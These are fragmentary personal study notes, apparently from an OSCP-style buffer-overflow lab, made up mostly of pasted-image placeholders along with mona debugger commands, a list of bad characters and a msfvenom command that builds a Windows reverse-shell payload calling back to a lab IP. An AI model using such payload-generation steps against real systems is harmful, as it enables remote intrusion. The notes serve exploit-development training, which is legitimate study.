...
![[Pasted image 20210530105938.png]]
...
![[Pasted image 20210530110528.png]]

`!mona findmsp -distance 2000`

![[Pasted image 20210530110743.png]]
...
## offset 
![[Pasted image 20210530111346.png]]
```python
import socket
...
![[Pasted image 20210530112355.png]]
...
`!mona compare -f C:\mona\oscp\bytearray.bin -a (ESP-add)`
 bad chars
exclude the next char after the every one except `\x00`
`\x00\x07\x2e\xa0`
...
copy the one with all/many false
![[Pasted image 20210530114329.png]]
...
## exploit
`msfvenom -p windows/shell_reverse_tcp LHOST=10.17.4.208 LPORT=9001 EXITFUNC=thread -f c -a x86 --platform windows -b "\x00\x07\x2e\xa0"`


![[Pasted image 20210530115357.png]]
